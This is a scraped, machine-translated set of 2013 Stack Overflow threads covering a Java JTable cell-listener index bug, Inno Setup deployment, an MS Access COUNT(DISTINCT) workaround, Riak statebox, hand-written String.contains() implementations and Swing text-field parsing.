            {"MX80", "desc5", "$1,995.00", "0%", "$1,995.00", new Integer(1), "$1,995.00"},
            {"MX90", "desc6", "$3,995.00", "0%", "$3,995.00", new Integer(1), "$3,995.00"},
            {"MX400", "desc7", "$15,995.00", "0%", "$15,995.00", new Integer(1), "$15,995.00"},
            {"MX600", "desc8", "$31,995.00", "0%", "$31,995.00", new Integer(1), "$31,995.00"},
            {"MS22-HW", "desc9", "$1,999.00", "0%", "$1,999.00", new Integer(1), "$1,999.00"},
            {"MS42-HW", "desc10", "$3,499.00", "0%", "$3,499.00", new Integer(1), "$3,499.00"},

        };

        // Create the TableModel and populate it  
        tableModel = new DefaultTableModel(data, columnNames) {
            Class [] classes = {String.class, String.class, String.class,
                String.class, String.class, int.class, String.class, Boolean.class};                
            @Override
            public Class getColumnClass(int column) {
                return classes[column];
            }
        };

        // Create a JTable and populate it with the content of the TableModel
        table = new JTable(tableModel) {
            @Override
            public boolean isCellEditable(int row, int column) {
                if (column == 0 || column == 1 || column == 2 || column == 4 ||
                        column == 6) {
                    return false;
                }
                return true;
            }
        };

        // This sorter is used for text filtering
        sorter = new TableRowSorter<>(tableModel);
        for (int column = 3; column < 6; column++) {
            sorter.setSortable(column, false);
        }
        table.setRowSorter(sorter);

        columnTotal= table.getColumnModel().getColumn(6);
        columnTotal.setPreferredWidth(100);

        // Filter user input in the quantity text field to only allow digits
        discountField =new JTextField();
        discountField.addKeyListener(new KeyAdapter() {
            @Override
            public void keyTyped(KeyEvent e)
            {
                if(!Character.isDigit(e.getKeyChar()) && e.getKeyChar() !=KeyEvent.VK_BACK_SPACE) {
                    discountField.setEditable(false);
                    discountField.setBackground(Color.WHITE);
                } else {
                    discountField.setEditable(true);
                }
            }
        });

        // Set the text field to the cells of the quantity column 
        columnQuantity = table.getColumnModel().getColumn(5);
        columnQuantity.setCellEditor(new DefaultCellEditor (discountField));

        // Filter user input in the discount text field to only allow digits
        quantityField =new JTextField();
        quantityField.addKeyListener(new KeyAdapter() {
            @Override
            public void keyTyped(KeyEvent e)
            {
                if(!Character.isDigit(e.getKeyChar()) && e.getKeyChar() !=KeyEvent.VK_BACK_SPACE) {
                    quantityField.setEditable(false);
                    quantityField.setBackground(Color.WHITE);
                    //JOptionPane.showMessageDialog(null,"Only digit input is allowed!");
                } else {
                    quantityField.setEditable(true);
                }
            }
        });

        // Set the text field to the cells of the quantity column 
        columnDiscount = table.getColumnModel().getColumn(3);
        columnDiscount.setCellEditor(new DefaultCellEditor(discountField));

        // Create an US number format
        localeUSFormat = Locale.US;
        decimalFormatUS = (DecimalFormat) DecimalFormat.getInstance(localeUSFormat);
        decimalFormatUS.setMaximumFractionDigits(2);

        // Create abstract action which listens for changes made in the JTable  
        Action actionTableListener = new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {

                TableCellListener tcl = (TableCellListener)e.getSource();
                // Get the current row and column index of the table
                selectedRowIndex = tcl.getRow();
                selectedColumnIndex = tcl.getColumn();  
                TableModel model = tcl.getTable().getModel();

                // Have a string variable check for null cell value 
                checkForNull = model.getValueAt(selectedRowIndex,selectedColumnIndex).toString();

                // Change the discounted and total price values 
                if (selectedColumnIndex == 3) {

                    // Check if the discount value is null and replace with 
                    // last used value if true                   
                    if (checkForNull.equals("")) {
                        model.setValueAt(backupDiscount + "%",selectedRowIndex, selectedColumnIndex);
                        return;
                    }

                    // Get the discount value and replace the '%' with nothing
                    valueDiscount = new BigDecimal(( model
                            .getValueAt(selectedRowIndex,selectedColumnIndex)
                            .toString().replaceAll("[%]","") ));
                    // 
                    model.setValueAt(valueDiscount + "%",selectedRowIndex, selectedColumnIndex);

                    // Check if the discount value is greater than 100
                    if ( (valueDiscount.compareTo(new BigDecimal(100)) == 1 ) ) {
                        model.setValueAt(backupDiscount + "%",selectedRowIndex, selectedColumnIndex);
                        JOptionPane.showMessageDialog(null,"Discount cannot be more than 100%.");
                    } else {
                        backupDiscount = valueDiscount;
                        valueDiscount = valueDiscount.divide(new BigDecimal(100)
                                , 2, BigDecimal.ROUND_HALF_EVEN);

                        // Calculate SP and Total values based on the discount input
                        valueGPL = new BigDecimal( ( model
                                .getValueAt(selectedRowIndex,selectedColumnIndex - 1)
                                .toString().replaceAll("[$,]","") ) );
                        // Get the quantity value
                        valueQuantity = Integer.parseInt( ( model
                                .getValueAt(selectedRowIndex,selectedColumnIndex + 2)
                                .toString() ) );
                        // Calculate the new discount value
                        resultDiscount = valueGPL.multiply(valueDiscount, 
                                new MathContext(BigDecimal.ROUND_HALF_EVEN));
                        // Calculate the new SP value
                        resultSP = valueGPL.subtract(resultDiscount, 
                                new MathContext(BigDecimal.ROUND_HALF_EVEN));
                        // Calculate the new result value
                        resultTotal = resultSP.multiply(new BigDecimal(valueQuantity), 
                                new MathContext(BigDecimal.ROUND_HALF_EVEN));
                        // Display the new SP value
                        model.setValueAt(DecimalFormat.getCurrencyInstance(localeUSFormat)
                                .format(resultSP),selectedRowIndex, selectedColumnIndex + 1);
                        // Display the new Total value
                        model.setValueAt(DecimalFormat.getCurrencyInstance(localeUSFormat)
                                .format(resultTotal),selectedRowIndex, selectedColumnIndex + 3);
                      }
                }
                // Change the total price values based on the quantity column 
                if (selectedColumnIndex == 5) {
                    // Check if the quantity value is null and replace with 
                    // last used value if true
                    if (checkForNull.equals("")) {
                        model.setValueAt(backupQuantity,selectedRowIndex, selectedColumnIndex);
                        return;
                    }

                    // Change total price value based on the quantity column
                    resultSP = new BigDecimal( ( model.
                            getValueAt(selectedRowIndex,
                            selectedColumnIndex - 1).toString().replaceAll("[$,]","") ) );
                    valueQuantity = Integer.parseInt( ( model.getValueAt(selectedRowIndex,
                            selectedColumnIndex).toString() ) );

                    // Check if the value quantity is over a certain limit
                    if (valueQuantity <= 0 || valueQuantity >= 999999) {
                        model.setValueAt(backupQuantity,selectedRowIndex, selectedColumnIndex);
                        JOptionPane.showMessageDialog(null,"Quantity value is too high or invalid!");
                    } else {

                        // If the value is under the limit: backup the new quantity
                        // value, calculate the new total value and display it
                        backupQuantity = valueQuantity;
                        resultTotal = resultSP.multiply(new BigDecimal(valueQuantity),
                                new MathContext(BigDecimal.ROUND_HALF_EVEN));
                        model.setValueAt(DecimalFormat.getCurrencyInstance(localeUSFormat)
                                .format(resultTotal), selectedRowIndex, selectedColumnIndex + 1);
                      }
                } 

            }
        }; // -> AbstractAction() 

        tableCellListener = new TableCellListener(table, actionTableListener);
        table.setPreferredScrollableViewportSize(table.
               getPreferredSize());       
        table.setRowHeight(22);

        setVisibleRowCount(table,10);

        table.setAutoResizeMode( JTable.AUTO_RESIZE_OFF );
        table.setFillsViewportHeight(true);
        table.getTableHeader().setReorderingAllowed(false);
        table.getTableHeader().setResizingAllowed(false);
        panelTable.add(new JScrollPane(table));
    } // -> createTable() 

    // Method to display a fixed number of rows in the JTable viewport
    public static void setVisibleRowCount(JTable table, int rows){ 
        int height = 0; 
        for(int row=0; row<rows; row++) {
            height += table.getRowHeight(row);
        } 
        table.setPreferredScrollableViewportSize(new Dimension( 
            table.getPreferredScrollableViewportSize().width, height )); 
     }

      // Create and display the contents of the frame
      public static void showGUI() {
        // Disable boldface controls
        UIManager.put("swing.boldMetal", Boolean.FALSE);

        // Create the frame
        frameTableCellChange = new JFrame("Table frame");
        frameTableCellChange.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);     
        frameTableCellChange.addWindowListener(new WindowAdapter() {
            @Override
                public void windowClosing(WindowEvent we) {
                System.exit(0);
            }
        });

        // Create and set up the content pane.
        TableCellChange newContentPane = new TableCellChange();
        newContentPane.setOpaque(true); //content panes must be opaque
        frameTableCellChange.setContentPane(newContentPane);

        // Arrange and display the window.
        frameTableCellChange.pack(); //must be called first 
        frameTableCellChange.setLocationRelativeTo(null); //center window
        frameTableCellChange.setResizable(false); 
        frameTableCellChange.setVisible(true);        
      } //-> showQueryResultGUI() 

   public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
         try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.
                    UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException | InstantiationException |
                IllegalAccessException |
                javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(TableCellChange.class.getName()).
                    log(java.util.logging.Level.SEVERE, null, ex);
        }
        // Display the frame and it's contents      
        TableCellChange.showGUI();
            }
        });
    } //-> main(String[] args)      

} //-> TableCellChange class 
```

**编辑**这个类是由 Rob Camick（又名 camickr）创建的，所有的功劳都归功于他创建了这段很棒的代码。为了遵守字符限制，仅从代码中删除了注释。

TableCellListener 类

```
import java.awt.event.ActionEvent;
import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import javax.swing.Action;
import javax.swing.JTable;
import javax.swing.SwingUtilities;

/*
 *  This class listens for changes made to the data in the table via the
 *  TableCellEditor. When editing is started, the value of the cell is saved
 *  When editing is stopped the new value is saved. When the old and new
 *  values are different, then the provided Action is invoked.
 *  The source of the Action is a TableCellListener instance.
 */
public class TableCellListener implements PropertyChangeListener, Runnable {
    private JTable table;
    private Action action;

    private int row;
    private int column;
    private Object oldValue;
    private Object newValue;

    public TableCellListener(JTable table, Action action) {
        this.table = table;
        this.action = action;

        this.table.addPropertyChangeListener(this);
    }

    private TableCellListener(JTable table, int row, int column, Object oldValue, Object newValue) {
        this.table = table;
        this.row = row;
        this.column = column;
        this.oldValue = oldValue;
        this.newValue = newValue;
    }

    public int getColumn() {
        return column;
    }

    public Object getNewValue() {
        return newValue;
    }

    public Object getOldValue() {
        return oldValue;
    }

    public int getRow() {
        return row;
    }

    public JTable getTable() {
        return table;
    }
    @Override
    public void propertyChange(PropertyChangeEvent e) {  
        if ("tableCellEditor".equals(e.getPropertyName())) {
            if (table.isEditing()) {
                processEditingStarted();
            } else {
                processEditingStopped();
            }
        }
    }

    private void processEditingStarted() {
        SwingUtilities.invokeLater(this);
    }
    @Override
    public void run() {
        row = table.convertRowIndexToView(table.getEditingRow());
        row = table.getEditingRow();

        column = table.convertColumnIndexToModel(table.getEditingColumn());

        oldValue = table.getModel().getValueAt(row, column);
        newValue = null;
    }

    private void processEditingStopped() {
        newValue = table.getModel().getValueAt(row, column);   
        if (!newValue.equals(oldValue)) {

            TableCellListener tcl = new TableCellListener(
                getTable(), getRow(), getColumn(), getOldValue(), getNewValue());

            ActionEvent event = new ActionEvent(
                tcl,
                ActionEvent.ACTION_PERFORMED,
                "");
            action.actionPerformed(event);
        }
    }
} 
```

我知道在过滤表时，表视图的索引会发生变化，并且必须与底层模型的索引同步。为了使过滤表工作，如何做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T20:15:00.113

您错误地实现了 TableCellListener 的操作。您不能使用选定的行/列，因为这些值在表格视图中。TableCellListener 在模型上工作。

查看[Table Cell Editor](http://tips4java.wordpress.com/2009/06/07/table-cell-listener/)提供的示例操作。要获取已更改的行/列，您必须引用 TableCellListener 本身。

编辑：

这是我的简单文本示例。当您更改“价格”时，“价格变化”和“价值”列会自动更新。

```
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.swing.table.*;

public class TableCellListenerTest
{
    public static void main(String[] args)
    {
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                createAndShowGUI();
            }
        });
    }

    public static void createAndShowGUI()
    {
        String[] columnNames = {"Stock", "Shares", "Price", "Price Change", "Value"};
        Object[][] data =
        {
            {"IBM",    new Integer(100),  new Double(85),  new Double(0), new Double(8500)},
            {"Apple",  new Integer(300),  new Double(30),  new Double(0), new Double(9000)},
            {"Sun",    new Integer(1500), new Double(5),   new Double(0), new Double(7500)},
            {"Google", new Integer(100),  new Double(100), new Double(0), new Double(10000)}
        };

        DefaultTableModel model = new DefaultTableModel(data, columnNames)
        {
            public Class getColumnClass(int column)
            {
                return getValueAt(0, column).getClass();
            }

            public boolean isCellEditable(int row, int column)
            {
                return column == 2;
            }
        };

        JTable table = new JTable(model);
        table.setPreferredScrollableViewportSize(table.getPreferredSize());
        JScrollPane scrollPane = new JScrollPane(table);

        //  Add a sorter

        TableRowSorter<DefaultTableModel> sorter = new TableRowSorter<DefaultTableModel>(model);
        table.setRowSorter(sorter);

        //  Filter

        try
        {
            RowFilter<DefaultTableModel, Object> rf = RowFilter.regexFilter("l", 0);
            sorter.setRowFilter(rf);
        }
        catch (java.util.regex.PatternSyntaxException e) {}

        Action action = new AbstractAction()
        {
            public void actionPerformed(ActionEvent e)
            {
                TableCellListener tcl = (TableCellListener)e.getSource();
                int column = tcl.getColumn();

                if (column == 2)
                {
                    int row = tcl.getRow();
                    double oldPrice = ((Double)tcl.getOldValue()).doubleValue();
                    double newPrice = ((Double)tcl.getNewValue()).doubleValue();
                    TableModel model = tcl.getTable().getModel();

                    double priceChange = new Double(newPrice - oldPrice);
                    model.setValueAt(priceChange, row, 3);

                    double shares = ((Integer)model.getValueAt(row, 1)).doubleValue();
                    Double value = new Double(shares * newPrice);
                    model.setValueAt(value, row, 4);
                }
            }
        };

      TableCellListener tcl = new TableCellListener(table, action);

        JFrame.setDefaultLookAndFeelDecorated(true);
        JFrame frame = new JFrame("Table Cell Listener");
        frame.setDefaultCloseOperation( JFrame.EXIT_ON_CLOSE );
        frame.add( scrollPane );
        frame.setSize(400, 160);
        frame.setLocationRelativeTo( null );
        frame.setVisible(true);
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-20T16:43:17.733

您可能需要进行从视图到模型的转换。看看*如何使用表格*教程的[排序和过滤](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#sorting)部分：

 *> 当表使用排序器时，用户看到的数据可能与数据模型指定的顺序不同，并且可能不包括数据模型指定的所有行。用户实际看到的数据称为视图，并且有自己的一组坐标。JTable 提供了从模型坐标转换为视图坐标的方法——convertColumnIndexToView 和 convertRowIndexToView——以及从视图坐标转换为模型坐标的方法——convertColumnIndexToModel 和 convertRowIndexToModel。

***编辑：从视图（表）转换为模型：***

替换这些行：

```
row = table.convertRowIndexToView(table.getEditingRow());
row = table.getEditingRow(); 
```

和：

```
row = table.convertRowIndexToModel(table.getEditingRow()); 
```*

# c# - Visual Studio 2012 C# 构建发布的最终设置

> ID：16122475
> 
> 赞同：0
> 
> 时间：2013-04-20T16:16:26.777
> 
> 标签：c#, visual-studio-2012, installation, exe

我在 VS2012 (C#) 上构建了一个具有以下功能的 Windows 应用程序

```
1\. Codes accessing pictures from project resources folder.
2\. Codes accessing other multimedia (like videos, txt, sounds, etc) using something like: addr = @directoryName + "\\videos\\*.mp4". 
```

因此，我在我的 Debug 文件夹中添加了几个文件夹，我需要这些文件夹与我的主 .exe 文件位于同一目录级别。在调试模式下一切正常，即使在没有调试模式的情况下运行 .exe 也是如此。

然后我使用 Inno Setup Compiler 创建了我的应用程序设置（一个 1.8GB 的​​设置文件，包括所需的所有资源），它在同一台计算机上就像魔术一样工作，但在另一台计算机上却不行。

然后我很好奇问题出在安装程序还是.exe上。所以我尝试将整个项目文件夹复制到我的另一台笔记本电脑中，在调试文件夹上运行 .exe 文件，但是没有，什么也没出现。检查任务管理器，发现我的 .exe 在进程选项卡下运行了 5 秒钟，然后它就消失了。（与此处所述的问题类似：[无法运行从 c# 创建的 .exe 文件](https://stackoverflow.com/questions/15223857/not-able-to-run-the-exe-file-created-from-c-sharp)）。

注意：.NET Framework 4.5 已经完美安装在另一台机器上，并且所有需要的文件都已复制。

所以现在我面临两个主要问题： - 首先，**我的 .exe 没有在另一台机器上运行**。- 其次，在我的设置文件**中包含哪些文件夹，**因为我不想包含 .cs 文件和其他源代码。足以让我的用户完美地运行我的应用程序。尝试过 Inno（最好的）、InstallShield 并快速浏览了 WIX。

任何帮助将不胜感激。近 2 周以来，一直在工作、搜索并在制作安装文件方面反复试验。提前致谢！问候，

肯

# sql - 如何将此 SQL 查询转换为 MS Access 查询？

> ID：16122476
> 
> 赞同：5
> 
> 时间：2013-04-20T16:16:39.760
> 
> 标签：sql, ms-access, distinct

我在 SQL 中有查询

```
SELECT        COUNT(DISTINCT dbo.Polling_Stations.P_ID) AS [Male Stations]
FROM            dbo.Agent INNER JOIN
                     dbo.Polling_Stations ON dbo.Agent.P_ID = dbo.Polling_Stations.P_ID
GROUP BY dbo.Polling_Stations.Gender
HAVING        (dbo.Polling_Stations.Gender = N'Male') 
```

我已将其转换为 Access：

```
SELECT        COUNT(DISTINCT Polling_Stations.P_ID) AS [Male Stations]
FROM            Agent INNER JOIN
                     Polling_Stations ON Agent.P_ID = Polling_Stations.P_ID
GROUP BY Polling_Stations.Gender
HAVING        (Polling_Stations.Gender = 'Male') 
```

但它给了我一个错误：查询表达式'Count（DISTINCT Polling_Stations.P_ID）'中的语法错误（缺少运算符）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T16:31:29.927

Access SQL 不支持`COUNT(DISTINCT ...)`，因此您需要这样做

```
SELECT COUNT(*) AS [Male Stations]
FROM
(
    SELECT DISTINCT Polling_Stations.P_ID
    FROM Agent INNER JOIN Polling_Stations 
        ON Agent.P_ID = Polling_Stations.P_ID
    WHERE Polling_Stations.Gender = "Male"
) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-20T16:31:09.783

访问不支持`Count(DISTINCT ...)`。 `SELECT DISTINCT`在子查询中，并从父查询中进行计数。

```
SELECT COUNT(ps.P_ID) AS [Male Stations]
FROM
    Agent
    INNER JOIN
    (
        SELECT DISTINCT P_ID
        FROM Polling_Stations
        WHERE Gender = 'Male'
    ) AS ps
    ON Agent.P_ID = ps.P_ID; 
```

# erlang - 如何在 riak 中结合 statebox 和 map/reduce

> ID：16122480
> 
> 赞同：1
> 
> 时间：2013-04-20T16:16:45.627
> 
> 标签：erlang, mapreduce, riak

是否可以在 riak 中结合 statebox 和 map/reduce？找不到任何示例，并且 statebox riak api 也不提供任何类型的 map/reduce 功能。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-21T10:03:28.497

在 mapreduce 阶段，您可以编写任何 erlang 代码。所以你可以从那里使用 statebox 模块，但是你会得到一些复杂性：

1.  你必须在 riak 的路径上有 statebox 模块（[add_paths](http://docs.basho.com/riak/latest/references/Configuration-Files/)选项）
2.  您将需要正确放置并[获取](https://github.com/mochi/statebox_riak/blob/master/src/statebox_riak.erl#L175)statebox 的选项
3.  您还需要 riak 方面的所有 statebox 的部门（包括 riakc）

# java - Java：在没有内置方法 contains() 的情况下实现 String 方法 contains()

> ID：16122481
> 
> 赞同：8
> 
> 时间：2013-04-20T16:16:51.623
> 
> 标签：java, string, contains

我试图在`String method contains()`不使用内置`contains()`方法的情况下实现。

这是我到目前为止所拥有的：

```
public static boolean containsCS(String str, CharSequence cs) {

    char[] chs = str.toCharArray();
    int i=0,j=chs.length-1,k=0,l=cs.length();

    //String      str = "Hello Java";
    //                   0123456789
    //CharSequence cs = "llo";

    while(i<j) {
        if(str.charAt(i)!=cs.charAt(k)) {
            i++;
        }
        if(str.charAt(i)==cs.charAt(k)) {

        }
    }

    return false;
} 
```

我只是在练习我的算法技能并被卡住了。

有什么建议吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2015-02-09T15:36:39.540

**仅使用 1 个循环**

我对 Poran 的回答做了一些补充，效果很好：

```
 public static boolean contains(String main, String Substring) {
    boolean flag=false;
    if(main==null && main.trim().equals("")) {
        return flag;
    }
    if(Substring==null) {
        return flag;
    }

    char fullstring[]=main.toCharArray();
    char sub[]=Substring.toCharArray();
    int counter=0;
    if(sub.length==0) {
        flag=true;
        return flag;
    }

    for(int i=0;i<fullstring.length;i++) {

        if(fullstring[i]==sub[counter]) {
            counter++;
        } else {
            counter=0;
        }

        if(counter==sub.length) {
            flag=true;
            return flag;
        }

    }
    return flag;

} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-09-27T18:22:29.480

这应该可以正常工作..我正在打印执行以帮助理解该过程。

```
public static boolean isSubstring(String original, String str){
    int counter = 0, oLength = original.length(), sLength = str.length();
    char[] orgArray = original.toCharArray(), sArray = str.toCharArray();
    for(int i = 0 ; i < oLength; i++){
        System.out.println("counter at start of loop " + counter);
        System.out.println(String.format("comparing %s with %s", orgArray[i], sArray[counter]));
        if(orgArray[i] == sArray[counter]){
            counter++;
            System.out.println("incrementing counter " + counter);
        }else{
            //Special case where the character preceding the i'th character is duplicate
            if(counter > 0){
                i -= counter;
            }
            counter = 0;
            System.out.println("resetting counter " + counter);
        }
        if(counter == sLength){
            return true;
        }
    }
    return false;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-20T16:23:14.393

正如 JB Nizet 所建议的，[这里](http://www.docjar.com/html/api/java/lang/String.java.html)是实际的代码`contains()`：

```
2123  public boolean contains(CharSequence s) {
2124      return indexOf(s.toString()) > -1;
2125  } 
```

这是代码`indexOf()`：

```
1732     public int indexOf(String str) {
1733         return indexOf(str, 0);
1734     } 
```

这导致：

```
 1752   public int indexOf(String str, int fromIndex) {
 1753       return indexOf(value, offset, count,
 1754                      str.value, str.offset, str.count, fromIndex);
 1755   } 
```

这最终导致：

```
 1770   static int indexOf(char[] source, int sourceOffset, int sourceCount,
 1771                      char[] target, int targetOffset, int targetCount,
 1772                      int fromIndex) {
 1773       if (fromIndex >= sourceCount) {
 1774           return (targetCount == 0 ? sourceCount : -1);
 1775       }
 1776       if (fromIndex < 0) {
 1777           fromIndex = 0;
 1778       }
 1779       if (targetCount == 0) {
 1780           return fromIndex;
 1781       }
 1782   
 1783       char first  = target[targetOffset];
 1784       int max = sourceOffset + (sourceCount - targetCount);
 1785   
 1786       for (int i = sourceOffset + fromIndex; i <= max; i++) {
 1787           /* Look for first character. */
 1788           if (source[i] != first) {
 1789               while (++i <= max && source[i] != first);
 1790           }
 1791   
 1792           /* Found first character, now look at the rest of v2 */
 1793           if (i <= max) {
 1794               int j = i + 1;
 1795               int end = j + targetCount - 1;
 1796               for (int k = targetOffset + 1; j < end && source[j] ==
 1797                        target[k]; j++, k++);
 1798   
 1799               if (j == end) {
 1800                   /* Found whole string. */
 1801                   return i - sourceOffset;
 1802               }
 1803           }
 1804       }
 1805       return -1;
 1806   } 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-20T16:24:28.773

提示：

*   使用嵌套循环。
*   将字符提取到数组中可能是个坏主意。但是，如果您要这样做，则应该使用它！
*   忽略使用快速字符串搜索算法的建议。它们仅适用于大规模搜索。（如果您查看 的代码`String.indexOf`，它只是进行简单的搜索......）

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-03-28T02:00:42.477

我想出了这个：

```
public static boolean isSubString(String s1, String s2) {
    if (s1.length() > s2.length())
        return false;

    int count = 0;

    //Loop until count matches needle length (indicating match) or until we exhaust haystack
    for (int j = 0; j < s2.length() && count < s1.length(); ++j) {
        if (s1.charAt(count) == s2.charAt(j)) {
            ++count;
        }
        else {
            //Redo iteration to handle adjacent duplicate char case
            if (count > 0)
                --j;

            //Reset counter
            count = 0;
        }
    }

    return (count == s1.length());
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-01-28T01:39:11.010

由于嵌套循环，当然不是最有效的解决方案，但它似乎工作得很好。

```
private static boolean contains(String s1, String s2) {
    if (s1.equals(s2)) return true;
    if (s2.length() > s1.length()) return false;

    boolean found = false;
    for (int i = 0; i < s1.length() - s2.length(); i++) {
        found = true;
        for (int k = 0; k < s2.length(); k++)
            if (i + k < s1.length() && s1.charAt(i + k) != s2.charAt(k)) {
                found = false;
                break;
            }
        if (found) return true;
    }
    return false;
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-01-13T11:35:27.857

我最近偶然发现了这个问题，尽管我会分享一个替代解决方案。我生成具有我们要查找的字符串长度的所有子字符串，然后将它们推入哈希集中并检查其中是否包含它。

```
 static boolean contains(String a, String b) {
    if(a.equalsIgnoreCase(b)) {
        return true;
    }
    Set<String> allSubStrings = new HashSet<>();
    int length = b.length();
    for(int i=0; i<a.length(); ++i) {
        if(i+length <= a.length()) {
            String sub = a.substring(i, i + length);
            allSubStrings.add(sub);
        }
    }
    return allSubStrings.contains(b);
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-01-19T00:25:13.097

```
 public static boolean contains(String large, String small) {

        char[] largeArr = large.toCharArray();
        char[] smallArr = small.toCharArray();

        if (smallArr.length > largeArr.length)
           return false;

        for(int i = 0 ; i <= largeArr.length - smallArr.length ; i++) {
            boolean result = true ;
            for(int j = 0 ; j < smallArr.length ; j++) {
                 if(largeArr[i+j] != smallArr[j]) {
                     result = false;
                     break;
                 }
                 result = result && (largeArr[i+j]==smallArr[j]); 
            }
            if(result==true) {return true;}
        }

        return false;
    } 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2014-09-15T22:25:42.177

可以使用单个循环来完成。

```
public boolean StringContains(String full, String part) {
    long st = System.currentTimeMillis();
    if(full == null || full.trim().equals("")){
        return false;
    }
    if(part == null ){
        return false;
    }
    char[] fullChars = full.toCharArray();
    char[] partChars = part.toCharArray();
    int fs = fullChars.length;
    int ps = partChars.length;
    int psi = 0;
    if(ps == 0) return true;
    for(int i=0; i< fs-1; i++){
        if(fullChars[i] == partChars[psi]){
            psi++; //Once you encounter the first match, start increasing the counter
        }
        if(psi == ps) return true;
    }
    long et = System.currentTimeMillis()- st;
    System.out.println("StringContains time taken =" + et);
    return false;
} 
```

# java - 字符串解析 - Java

> ID：16122484
> 
> 赞同：-7
> 
> 时间：2013-04-20T16:17:13.897
> 
> 标签：java

我对java很陌生，所以请放轻松！

我创建了一个窗口、窗格、标签、文本字段等。

什么是查看用户在文本字段中输入的内容（作为字符串）的最简单代码，正如我所知道的可以使用的浮点数`Float.parseFloat(txtName.getText());`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:27:01.413

为了我对这个问题的理解，这是一个简单的示例，输出在 a 中输入的内容`JTextField`并将其附加到 a `JTextArea`：

![在此处输入图像描述](https://i.stack.imgur.com/mB1mo.png)

```
public class Test {
    private static String ENTER = "Enter";
    static JButton enterButton;
    public static JTextArea output;
    public static JTextField input;
    static JFrame frame;
    static JPanel panel;

    public static void main(String... args)
    {
        try
        {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Exception ex)
        {
            ex.printStackTrace();
        }
        createFrame();
    }

    public static void createFrame()
    {
        frame = new JFrame("Test");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        panel = new JPanel();
        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
        panel.setOpaque(true);
        ButtonListener buttonListener = new ButtonListener();
        output = new JTextArea(15, 50);
        output.setWrapStyleWord(true);
        output.setEditable(false);
        JScrollPane scroller = new JScrollPane(output);
        scroller.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        scroller.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        JPanel inputpanel = new JPanel();
        inputpanel.setLayout(new FlowLayout());
        input = new JTextField(20);
        enterButton = new JButton("Enter");
        enterButton.setActionCommand(ENTER);
        enterButton.addActionListener(buttonListener);
        input.setActionCommand(ENTER);
        input.addActionListener(buttonListener);
        DefaultCaret caret = (DefaultCaret) output.getCaret();
        caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
        panel.add(scroller);
        inputpanel.add(input);
        inputpanel.add(enterButton);
        panel.add(inputpanel);
        frame.getContentPane().add(BorderLayout.CENTER, panel);
        frame.pack();
        frame.setLocationByPlatform(true);
        // Center of screen
        // frame.setLocationRelativeTo(null);
        frame.setVisible(true);
        frame.setResizable(false);
        input.requestFocus();
    }

    public static class ButtonListener implements ActionListener
    {

        public void actionPerformed(final ActionEvent ev)
        {
            Thread thread = new Thread()
            {

                public void run()
                {
                    if (!input.getText().trim().equals(""))
                    {
                        String cmd = ev.getActionCommand();
                        if (ENTER.equals(cmd))
                        {
                            output.append(input.getText() + "\n");
                        }
                    }
                    input.setText("");
                    input.requestFocus();
                }
            };
            thread.start();
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:53:09.783

注意：如果你想真正做到正确，你可以实现一个 JTextField 的子类，它甚至不允许用户输入无效浮点数的字符：

```
public class FloatField extends JTextField {

    public FloatField(int cols) {
        super(cols)
    } 

    protected Document createDefaultModel() { 
        return new FloatDocument();
    } 

    static class FloatDocument extends PlainDocument {

        public void insertString(int offs, String str, AttributeSet a)
                          throws BadLocationException { 
            if( str == null ) 
                return;

            // Reject any string with invalid float characters.
            // TODO: this could be more sophisticated
            int len = str.length();
            for (int i = 0; i < len; ++i) {
                char c = str.charAt(i);
                if (c != '.' && c != '-' && !Character.isDigit(c))
                    return;
            }
            super.insertString(offs, str, a);
        } 
    } 
} 
```

注意：这是一个不完美的实现，仅用于说明目的，仍然有许多无效的浮点数会允许泄漏。

# iphone - 将 UIPickerView 添加到 UIActionSheet（底部的按钮）

> ID：16122487
> 
> 赞同：2
> 
> 时间：2013-04-20T16:17:34.030
> 
> 标签：iphone, ios, objective-c, uipickerview, uiactionsheet

我想要

1.  显示选择器视图（向上滑动）
2.  在可见时停用背景
3.  在底部（而不是顶部）显示（UIActionSheet）按钮

起初在我看来这是一个简单的解决方案，因为您可以在网络上的任何地方找到将选择器视图添加到操作表的代码，但是所有解决方案都将按钮放在顶部，**我需要将按钮放在操作表的底部（对齐？）**。

